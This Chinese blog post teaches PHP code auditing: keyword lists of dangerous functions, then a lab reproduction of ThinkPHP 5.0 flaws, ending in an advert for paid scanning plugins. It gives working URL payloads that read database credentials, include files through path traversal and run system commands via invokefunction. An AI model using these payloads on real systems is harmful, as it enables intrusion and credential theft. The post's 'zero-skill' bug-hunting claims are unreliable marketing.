> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg5NDg4MzYzNQ==&mid=2247486586&idx=1&sn=a64429cb46676df4b223b1e98cd3ad4b

#  代码审计-thinkphp历史漏洞挖掘  
原创 兰陵猪猪哼  小黑子安全   2025-07-21 04:54  
  
代码审计必备知识点：  
  
1  
、  
代码审计开始前准备：  
  
环境搭建使用，工具插件安装使用，掌握各种漏洞原理及利用  
,  
代码开发类知识点。  
  
2、代码审计前信息收集：  
  
审计目标的程序名，版本，当前环境(系统,中间件,脚本语言等信息),各种插件等。  
  
3、代码审计挖掘漏洞根本：  
  
可控变量及特定函数，不存在过滤或过滤不严谨可以绕过导致的安全漏洞。  
  
4、代码审计展开计划：  
  
审计项目漏洞原理->审计思路->完整源码->应用框架->验证并利用漏洞。  
  
代码审计两种方法  
：  
  
功能点或关键字分析可能存在  
的  
漏洞  
  
-  
抓包或搜索关键字找到代码出处及对应文件  
。  
  
-  
追踪过滤或接收的数据函数，寻找触发此函数或代码的地方进行触发测试。  
  
  
-常规或部分M  
VC  
模型源码可以采用关键字的搜索挖掘思路。  
  
  
-框架  
  
MV  
C   
墨香源码一般会采用功能点分析抓包追踪挖掘思路。  
  
1.  
搜索关键字找敏感函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCCYEwz6P0TOt7ep6Ys8tgPr8cLJ3Udc4mHiclRROb5ricE1YiaFRS2cIicYQ/640?wx_fmt=png&from=appmsg "")  
  
2.  
根据目标功能点判断可能存在的漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCCrruViafRH38poSzo4pDY9lfe5Dp516ok91AvRDd7LBB88sN3C8ws0gA/640?wx_fmt=png&from=appmsg "")  
  
常见漏洞关键字：  
  
SQL注入：  
  
select insert update mysql_query mysqli等  
  
文件上传：  
  
$_FILES，type="file"，上传，move_uploaded_file()等   
  
XSS跨站：  
  
print print_r echo sprintf die var_dump var_export等  
  
文件包含：  
  
include include_once require require_once等  
  
代码执行：  
  
evalassert preg_replace   
  
call_user_func   
  
call_user_func_array等  
  
命令执行：  
  
systemexec shell_exec   
  
`  
  
` passthru pcntl_exec popen proc_open等  
  
变量覆盖：  
  
extract()parse_str() import  
_  
request  
_  
variables() $$ 等  
  
反序列化：  
  
serialize()unserialize()  
  
 __construct  
  
   
  
__destruct等  
  
文件读取：  
  
fopen f  
ile_get_contents  
  
fread  
  
fgets  
  
fgetss  
  
file  
    
fpassthru  
  
parse_ini_file  
  
readfile等  
  
文件删除：  
  
unlink()remove()等  
  
文件下载：  
  
download()  
  
download_file()  
等  
  
通用关键字：  
  
$_GET,$_POST,$_REQUEST,$_FILES,$_SERVER等  
  
T  
hinkphp  
框架介绍  
  
使用  
thinkphp  
框架的源码审计思路：  
  
1.  
使用源码查看工具打开源码，全局搜索  
thinkphp  
确认源码是否使用  
thinkphp  
框架  
  
2.  
源码如果没有按照  
thinkphp  
框架的代码规则来写，则不会触发  
thinkphp  
框架的过滤规则。按照常规思路测试即可  
  
3.  
源码如果是按照  
thinkphp  
框架的代码规则来写的，则全局搜索THINK_VERSION确认框架版本信息，根据版本漏洞来测试。否则相当于在测试框架的  
0day  
。  
  
案例：  
T  
hinkphp5.0  
版本漏洞复现  
  
thinkphp  
历史漏洞：  
https://y4er.com/posts/thinkphp5-rce/  
  
1.  
搭建好  
thinkphp  
框架，使用  
phpstorm  
打开源码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCCe5liaLOc0bUybWFFITDsBB9YKXg1GHWt02E2gdx8ng9NsnpIREMtdnw/640?wx_fmt=png&from=appmsg "")  
  
2.  
想要知道  
thinkphp  
准确版本信息，可以全局搜索：  
think_version  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCCQIXPHXPqAicazCrQaHFenlpZkLHyIzicNVG8HnbnQQLJSkMYmKP8bN1w/640?wx_fmt=png&from=appmsg "")  
  
3.  
获取到版本信息，搜索查看此版本产生的历史漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCCqUff0OFy7s7JibRqPskxMqRs6LRhj9GmFkdialk3OeXZictpeEUg2icbiaA/640?wx_fmt=png&from=appmsg "")  
  
4.  
以上漏洞都是直接访问路由触发的。  
  
复现第一个漏洞：获取配置信息  
  
访问：?s=index/think\config/get&name=database.username  
  
成功获取数据库用户名  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCCBU4wE6j6aMHNu5Asj6lEzhM4Cbk08IMKqxaUicWCBFIcibre668UZSrQ/640?wx_fmt=png&from=appmsg "")  
  
访问：?s=index/think\config/get&name=database.  
password   
成功获取数据库密码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCCZodNeAnvpyWQSjicbptxysp2kyvIsRvVhiate5l5GZMghBByotMMrP6A/640?wx_fmt=png&from=appmsg "")  
  
复现第二个漏洞：包含任意文件  
  
在  
public  
目录创建一个  
1.txt  
文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCCTibVl3NLficjxPpYfDIqvjfiaIcUPLdkYQTgqhow4ib6uUVVOic941EiaWjA/640?wx_fmt=png&from=appmsg "")  
  
访问：  
?s=index/\think\Lang/load&file=1.txt  
     
包含  
1.  
txt  
文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCCAQdrw56ezZqNya0khcKZmxWdOjPfUustcfagHS06Cib4B8voy9FINUQ/640?wx_fmt=png&from=appmsg "")  
  
复现第三个漏洞：包含  
.  
php  
文件  
  
根目录创建  
1.  
php  
文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCClbqxIIMO4ScKhARPrKFvGK11QLeJpFJm6FwVVjWrrZiaL0L1cecictgA/640?wx_fmt=png&from=appmsg "")  
  
访问：  
?s=index/\think\Config/load&file=../1.php  
    
包含  
1.  
php  
文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCCrykVzhmV3Szbm4eaibKJNXTXSp01JiaoDkKHP89dmcIgoDwt6IY6BNOQ/640?wx_fmt=png&from=appmsg "")  
  
复现第五个漏洞：远程命令执行  
  
访问：?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=whoami  
  
执行：  
whoami   
命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCCG3CGgJ6OWffLgR0VhicBcMNia8jM1l8Ht9KVkjw0xlohskYlZak4q5zg/640?wx_fmt=png&from=appmsg "")  
  
访问：?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=  
ipconfig  
  
执行：  
ipconfig   
命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIlnNxeT7FCVA8Hp7B3HBpCCIdGkDvVszlfQlLTMvrxiavGl6icFFaian6Ec3nGPYbFsUsicztELQica5Nw/640?wx_fmt=png&from=appmsg "")  
  
如果框架只爆出了漏洞基础信息，没有公开漏洞产生位置和利用  
exp  
，就可以尝试使用对比工具对比前后版本的更新差异来判断漏洞产生位置。实现挖掘  
1day  
。  
  
推荐一下作者最新研发的yakit被动漏洞检测插件，可挖掘企业src漏洞。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCImmI8E9Zf6JqGRia9JWljiaavtzDPaxIm6PXM8IuzuAB6ViceOVwpEMvHH403GNQp59nju2Q49TvqOpg/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
以上漏洞都是不需要任何技巧的，作者只是开启插件在目标网站用鼠标“点点点点”就挖掘出这么多漏洞，完全  
  
“零基础”“  
  
零成本”挖洞  
  
目前一共开发了四个插件：  
  
被动  
sql  
注入检测  
  
被动  
xss  
扫描优化版  
  
被动目录扫描好人版  
  
被动  
ssrf  
及  
log4j  
检测  
  
插件使用效果：[记一次企业src漏洞挖掘连爆七个漏洞！](https://mp.weixin.qq.com/s?__biz=Mzg5NDg4MzYzNQ==&mid=2247486552&idx=1&sn=41c4e4a40fd104f53e22f5a7143c88ad&scene=21#wechat_redirect)  
  
  
插件使用教程：  
[新一代SQL注入检测技术，小白也能轻松挖到漏洞！](https://mp.weixin.qq.com/s?__biz=Mzg5NDg4MzYzNQ==&mid=2247486516&idx=1&sn=8ce41df1c1c32eddb5762dc6c362a85b&poc_token=HEcld2ij2mPrmNUdYokG5LVG3B9lMQFCmGocR1XA&scene=21#wechat_redirect)  
  
  
知识星球——小黑子安全圈  
[  
精华版  
]  
    
开业大吉！  
  
每一个插件都是非常实用的，有没有用作者也已经通过  
  
企业  
src   
漏洞的挖掘来证明了，并且只需要开启插件  
  
点击鼠标就可以全自动挖掘漏洞。  
  
需要获取插件的小伙伴可以扫描下方二维码加入我的知识星球，星球  
 99  
元  
/  
年  
  
，前  
50  
个加入的  
 77  
元  
/  
年。  
  
加入知识星球的同学会提供  
  
yakit  
  
安装  
  
和  
  
插件  
  
使用教程。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9ibb0kbHCImmI8E9Zf6JqGRia9JWljiaavyafDg4ZciajrrTwTH4VWgO5MnmzRk1FMbiaZT2mQxbjb1JJicMDQLXDlw/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp "")  
  
本星球只提供精华内容，没有烂大街的东西。会持续更新  
yakit  
插件和各种漏洞漏洞探针和利用工具，哪怕你是什么都不懂的小白用了插件点点鼠标就能挖到漏洞。  
  
注！！！红包返现！！！拉新活动！！！  
  
星球接受使用插件挖到漏洞的投稿，我审核通过会返  
30  
红包，直接微信转，文章我会发公众号  
(  
每人仅限一次  
)  
。  
  
拉新人加入星球待满三天也会返  
20  
红包  
(  
微信直接转  
)  
。插件会一直优化和上新，欢迎大家加入星球。  
  
  
  
  
